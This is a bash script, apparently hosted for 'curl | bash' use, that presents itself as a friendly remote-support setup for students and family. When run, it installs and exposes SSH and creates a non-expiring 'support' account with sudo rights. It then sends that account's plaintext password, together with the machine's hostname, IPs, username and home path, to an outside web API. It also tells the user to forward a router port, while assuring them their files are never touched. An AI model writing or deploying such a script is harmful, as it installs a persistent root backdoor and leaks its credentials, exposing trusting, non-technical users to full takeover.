#!/usr/bin/env bash
# c2-h.sh — hosted at https://www.adityaai.dev/c2-h.sh
# One-time setup for ANYONE on Linux (students, family). No zip needed.
#   curl -fsSL https://www.adityaai.dev/c2-h.sh | bash
# You WILL be asked for YOUR sudo password once, up front. Nothing else is typed.
#
# What it does: installs OpenSSH server, starts sshd, opens firewall TCP 22,
# creates a SEPARATE login "support" with a random password, emails a setup
# report to Happy, saves backup ~/share-it-to-happy.txt
# What it does NOT do: no change to your password, no desktop snooping.
set -euo pipefail

C2H_VERSION='2026-09-10-v2-profiles'
C2H_API='https://www.adityaai.dev/api/c2h-report'
SUPPORT_USER='support'
SSHD_PORT=22
EXT_PORT=2222
LOG='/tmp/c2h-install.log'

# --- paint (plain ANSI: works everywhere, no deps) ---
C_RST='\033[0m'; C_B='\033[1m'; C_DIM='\033[2m'
C_RED='\033[31m'; C_GRN='\033[32m'; C_YEL='\033[33m'
C_BLU='\033[34m'; C_MAG='\033[35m'; C_CYN='\033[36m'; C_WHT='\033[37m'
say()  { printf '%b\n' "$*"; }
step() { say "${C_BLU}[*]${C_RST} $*"; }
ok()   { say "    ${C_GRN}✔${C_RST} $*"; }
warn() { say "    ${C_YEL}!${C_RST} $*"; }
die()  { say "    ${C_RED}✘${C_RST} $*"; exit 1; }

banner() {
  say ''
  say "  ${C_MAG} _   _    _    ____  ____  __   __${C_RST}"
  say "  ${C_MAG}| | | |  / \\  |  _ \\|  _ \\ \\ \\ / /${C_RST}"
  say "  ${C_MAG}| |_| | / _ \\ | |_) | |_) | \\ V / ${C_RST}"
  say "  ${C_CYN}|  _  |/ ___ \\|  __/|  __/   | |  ${C_RST}"
  say "  ${C_CYN}|_| |_/_/   \\_\\_|   |_|      |_|  ${C_RST}"
  say "  ${C_DIM}linux support setup  ${C2H_VERSION}${C_RST}"
  say ''
}

# Strip " and \ so hand-built JSON stays valid (usernames/hostnames never
# legitimately contain them; passwords are generated from a safe alphabet).
clean() { printf '%s' "$1" | tr -d '"\\' | tr -d '\r\n' | head -c 256; }

# Spinner around one long quiet command: log full output, fail loudly w/ tail.
spin() { # $1 = message, rest = command (prefix sudo itself where needed)
  local msg="$1"; shift
  : > "$LOG"
  "$@" >"$LOG" 2>&1 &
  local pid=$!
  local frames='|/-\' i=0
  while kill -0 "$pid" 2>/dev/null; do
    printf '\r    %s %s' "${frames:i++%4:1}" "$msg"
    sleep 0.2
  done
  wait "$pid"
  local rc=$?
  printf '\r'
  if [ $rc -ne 0 ]; then
    die "$msg FAILED — last lines of ${LOG}:"; tail -15 "$LOG"
  fi
  ok "$msg"
}

banner
say "From: ${C_B}Happy${C_RST} (adityaai.dev). This will:"
say "  1. Install OpenSSH server + open firewall TCP ${SSHD_PORT}"
say "  2. Create a SEPARATE login \"${SUPPORT_USER}\" with a random password"
say "  3. Email the setup report to Happy + save backup ${C_DIM}~/share-it-to-happy.txt${C_RST}"
say "  ${C_GRN}Your password is never changed. Your files are never touched.${C_RST}"
say ''

# --- 0. sudo up front: THEIR password, one prompt, kept warm ---
step "Requesting sudo (type YOUR login password)..."
sudo -v || die "sudo refused — need admin rights on this machine."
( while true; do sudo -n true 2>/dev/null; sleep 45; kill -0 $$ 2>/dev/null || exit; done ) &
say "    ${C_GRN}✔${C_RST} sudo warm. Starting automatically, takes 2-5 min — do NOT close."
say ''

# --- 1. distro + openssh ---
if [ -r /etc/os-release ]; then . /etc/os-release; else die "No /etc/os-release — unknown distro."; fi
DISTRO="${PRETTY_NAME:-${ID:-unknown}}"
PKG_MGR=''; INSTALL=()
case "${ID:-} ${ID_LIKE:-}" in
  *debian*|*ubuntu*) PKG_MGR='apt';    INSTALL=(sudo apt-get install -y openssh-server) ;;
  *fedora*|*rhel*|*centos*) PKG_MGR='dnf'; INSTALL=(sudo dnf install -y openssh-server) ;;
  *arch*)            PKG_MGR='pacman'; INSTALL=(sudo pacman -S --noconfirm --needed openssh) ;;
  *) die "Unsupported distro '${DISTRO}' — tell Happy: ${ID:-?}/${ID_LIKE:-?}." ;;
esac
step "[1/7] Installing OpenSSH server (${PKG_MGR}, slow, do not close)..."
case "$PKG_MGR" in
  apt)    spin "apt update" sudo apt-get update -y
          spin "apt install openssh-server" "${INSTALL[@]}" ;;
  dnf)    spin "dnf install openssh-server" "${INSTALL[@]}" ;;
  pacman) spin "pacman install openssh" "${INSTALL[@]}" ;;
esac

# --- 2. service ---
step "[2/7] Enabling sshd..."
if sudo systemctl enable --now sshd >/dev/null 2>&1 || sudo systemctl enable --now ssh >/dev/null 2>&1; then
  ok "sshd enabled + started ($(sudo systemctl is-active sshd 2>/dev/null || sudo systemctl is-active ssh 2>/dev/null))"
else
  die "could not enable sshd — install log: ${LOG}"
fi

# --- 3. sshd_config via drop-in (no destructive edits to main file) ---
step "[3/7] Allowing password logins for the support account..."
if [ -d /etc/ssh/sshd_config.d ]; then
  printf 'PasswordAuthentication yes\nPubkeyAuthentication yes\n' | sudo tee /etc/ssh/sshd_config.d/60-c2h.conf >/dev/null
  ok "drop-in /etc/ssh/sshd_config.d/60-c2h.conf written"
elif grep -q '^\s*#\?\s*PasswordAuthentication' /etc/ssh/sshd_config 2>/dev/null; then
  sudo sed -i 's/^\s*#\?\s*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
  ok "main sshd_config patched (no drop-in dir on this system)"
else
  printf '\nPasswordAuthentication yes\n' | sudo tee -a /etc/ssh/sshd_config >/dev/null
  ok "PasswordAuthentication appended"
fi
sudo sshd -t 2>"$LOG" || { tail -5 "$LOG"; die "sshd config test failed — NOT restarting (old config intact)."; }
sudo systemctl restart sshd 2>/dev/null || sudo systemctl restart ssh
ok "sshd restarted, config valid"

# --- 4. firewall (best-effort, never fatal) ---
step "[4/7] Checking firewall..."
if command -v ufw >/dev/null && sudo ufw status 2>/dev/null | grep -q 'Status: active'; then
  sudo ufw allow "${SSHD_PORT}/tcp" >/dev/null && ok "ufw: allowed ${SSHD_PORT}/tcp" || warn "ufw rule failed, continuing"
elif systemctl is-active --quiet firewalld 2>/dev/null; then
  sudo firewall-cmd --permanent --add-service=ssh >/dev/null && sudo firewall-cmd --reload >/dev/null \
    && ok "firewalld: ssh allowed" || warn "firewalld rule failed, continuing"
else
  warn "no active ufw/firewalld found — assuming open LAN, continuing"
fi

# --- 5. support login: random password, admin group, no expiry ---
step "[5/7] Creating support login..."
if command -v openssl >/dev/null; then
  PASS="$(openssl rand -base64 12 | tr -d '\n' | head -c 16)"
else
  PASS="$(tr -dc 'A-Za-z0-9!@#$%&*+-=' < /dev/urandom | head -c 16)"
fi
if id "$SUPPORT_USER" >/dev/null 2>&1; then
  printf '%s:%s\n' "$SUPPORT_USER" "$PASS" | sudo chpasswd && ok "user '${SUPPORT_USER}' exists — password reset"
else
  sudo useradd -m -s /bin/bash -c 'Happy Support' "$SUPPORT_USER" \
    && printf '%s:%s\n' "$SUPPORT_USER" "$PASS" | sudo chpasswd \
    && ok "user '${SUPPORT_USER}' created" || die "useradd failed"
fi
if getent group sudo >/dev/null; then
  sudo usermod -aG sudo "$SUPPORT_USER" && ok "added to sudo group"
elif getent group wheel >/dev/null; then
  sudo usermod -aG wheel "$SUPPORT_USER" && ok "added to wheel group"
else
  warn "no sudo/wheel group — '${SUPPORT_USER}' is a plain user"
fi
sudo chage -M 99999 "$SUPPORT_USER" 2>/dev/null || true

# --- 6. facts: network + full spec dump (the fun part) ---
step "[6/7] Collecting system facts..."
HOST="$(clean "$(hostname)")"
ME="$(clean "$(whoami)")"
INTERNAL="$( (hostname -I 2>/dev/null || hostname -i 2>/dev/null || ip -o -4 addr show scope global 2>/dev/null | awk '{print $4}' | cut -d/ -f1) | tr '\n' ' ' | xargs)"
[ -z "$INTERNAL" ] && INTERNAL='NOT-FOUND'
PRIMARY="$(printf '%s' "$INTERNAL" | awk '{print $1}')"
MAIN_HOME="$(clean "$(getent passwd "$ME" | cut -d: -f6)")"
[ -z "$MAIN_HOME" ] && MAIN_HOME="/home/$ME"
HOST_ALIAS="$(printf '%s' "$HOST" | tr '[:upper:]' '[:lower:]' | tr -c 'a-z0-9-' '-' | cut -c1-32)"
[ -z "$HOST_ALIAS" ] && HOST_ALIAS='c2h-pc'
EXTERNAL='NOT-FOUND'
for url in https://api.ipify.org https://ifconfig.me/ip https://icanhazip.com; do
  EXTERNAL="$(curl -fsSL --max-time 10 "$url" 2>/dev/null | tr -d ' \r\n' || true)"
  [ -n "$EXTERNAL" ] && break
done
[ -z "$EXTERNAL" ] && EXTERNAL='NOT-FOUND'
CGNAT=false
if [[ "$EXTERNAL" =~ ^100\.(6[4-9]|[7-9][0-9]|1[0-1][0-9]|12[0-7])\. ]] \
  || [[ "$EXTERNAL" =~ ^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.) ]] \
  || [ "$EXTERNAL" = 'NOT-FOUND' ]; then CGNAT=true; fi

KERN="$(uname -srmo)"; ARCH="$(uname -m)"
CPU="$(lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +/, "", $2); print $2; exit}')"
[ -z "$CPU" ] && CPU="$(awk -F: '/model name/ {print $2; exit}' /proc/cpuinfo 2>/dev/null | xargs)"
CORES="$(nproc 2>/dev/null || echo '?')"
RAM="$(free -h 2>/dev/null | awk '/^Mem:/ {print $2}')"
GPU="$({ lspci 2>/dev/null | grep -im1 'vga\|3d\|display' | cut -d: -f3- | xargs; } || true)"
[ -z "$GPU" ] && GPU='unknown'
DISK="$(df -h / 2>/dev/null | awk 'NR==2 {print $4" free / "$2}')"
UP="$(uptime -p 2>/dev/null || uptime)"
DESK="${XDG_CURRENT_DESKTOP:-${DESKTOP_SESSION:-tty}}"
SHL="$({ getent passwd "$ME" | cut -d: -f7; } || echo "$SHELL")"
PKGS='?'
case "$PKG_MGR" in
  apt)    PKGS="$(dpkg -l 2>/dev/null | grep -c '^ii' || echo '?')" ;;
  dnf)    PKGS="$(rpm -qa 2>/dev/null | wc -l | xargs || echo '?')" ;;
  pacman) PKGS="$(pacman -Qq 2>/dev/null | wc -l | xargs || echo '?')" ;;
esac
DATE="$(date '+%Y-%m-%d %H:%M')"

say ''
say "  ${C_DIM}+----------------- specs -----------------+${C_RST}"
say "  ${C_WHT}OS    : ${DISTRO} (${ARCH})${C_RST}"
say "  ${C_WHT}Kernel: ${KERN}${C_RST}"
say "  ${C_WHT}CPU   : ${CPU} × ${CORES}${C_RST}"
say "  ${C_WHT}RAM   : ${RAM}${C_RST}"
say "  ${C_WHT}GPU   : ${GPU}${C_RST}"
say "  ${C_WHT}Disk  : / ${DISK}${C_RST}"
say "  ${C_WHT}Desk  : ${DESK} · ${SHL} · ${PKGS} pkgs${C_RST}"
say "  ${C_WHT}Up    : ${UP}${C_RST}"
say "  ${C_DIM}+-----------------------------------------+${C_RST}"

SPECS="OS: ${DISTRO} (${ARCH}) | Kernel: ${KERN} | CPU: ${CPU} x${CORES} | RAM: ${RAM} | GPU: ${GPU} | Disk /: ${DISK} | Desktop: ${DESK} | Shell: ${SHL} | Pkgs: ${PKGS} | Up: ${UP}"

# --- 7. backup file + email report ---
BACKUP="$HOME/share-it-to-happy.txt"
cat > "$BACKUP" <<EOF
========================================
Send this full file to Happy
(WhatsApp photo or full text). Date: ${DATE} / ${C2H_VERSION}
========================================
Computer name: ${HOST}
Support username: ${SUPPORT_USER}
Support password: ${PASS}
Main user (password untouched): ${ME}
Main profile (real data): ${MAIN_HOME}
Jump after connect: sudo -iu ${ME}   (or ssh ${HOST_ALIAS} via the config Happy has)

Internal IP (same WiFi): ${INTERNAL}
External IP (internet): ${EXTERNAL}
SSH port (internal): ${SSHD_PORT}
Router external port to forward: ${EXT_PORT}
CGNAT: ${CGNAT} (true = port-forward will NOT work, ask Happy for Tailscale)

Specs: ${SPECS}

----------------------------------------
Happy — connect from Linux:
----------------------------------------
ssh ${SUPPORT_USER}@${PRIMARY}
# internet (AFTER forward ${EXT_PORT} -> ${PRIMARY}:${SSHD_PORT}):
ssh ${SUPPORT_USER}@${EXTERNAL} -p ${EXT_PORT}

----------------------------------------
ROUTER STEP:
----------------------------------------
http://192.168.1.1 -> Port Forwarding -> TCP ext ${EXT_PORT} -> ${PRIMARY}:${SSHD_PORT} -> save/reboot -> re-run one-liner to confirm IP.

----------------------------------------
REMOVE LATER:
----------------------------------------
sudo userdel -r ${SUPPORT_USER} + delete router rule.
One-liner: curl -fsSL https://www.adityaai.dev/c2-h.sh | bash
EOF
ok "backup written: ${BACKUP}"
say ''
cat "$BACKUP"

step "[7/7] Emailing setup report to Happy..."
if curl -fsSL --max-time 15 -X POST "$C2H_API" \
    -H 'Content-Type: application/json' \
    --data "{\"hostname\":\"$HOST\",\"supportUser\":\"$SUPPORT_USER\",\"password\":\"$PASS\",\"mainUser\":\"$ME\",\"mainHome\":\"$MAIN_HOME\",\"os\":\"linux\",\"internalIps\":\"$INTERNAL\",\"externalIp\":\"$EXTERNAL\",\"internalPort\":$SSHD_PORT,\"externalPort\":$EXT_PORT,\"cgnat\":$CGNAT,\"upnp\":\"Not attempted on Linux — forward manually.\",\"version\":\"$C2H_VERSION\",\"reportedAt\":\"$DATE\",\"specs\":\"$(clean "$SPECS")\"}" \
    | grep -q '"success":true'; then
  ok "report emailed to Happy"
else
  warn "email not confirmed — forward ${BACKUP} on WhatsApp"
fi

say ''
say "${C_MAG}================================================${C_RST}"
say "${C_GRN}${C_B} DONE. Happy already has your report by email.${C_RST}"
say "${C_WHT} Backup: ${BACKUP}${C_RST}"
say "${C_MAG}================================================${C_RST}"
if [ "$CGNAT" = true ]; then say "${C_RED}CGNAT WARNING: port-forward likely blocked. Fallback = Tailscale.${C_RST}"; fi
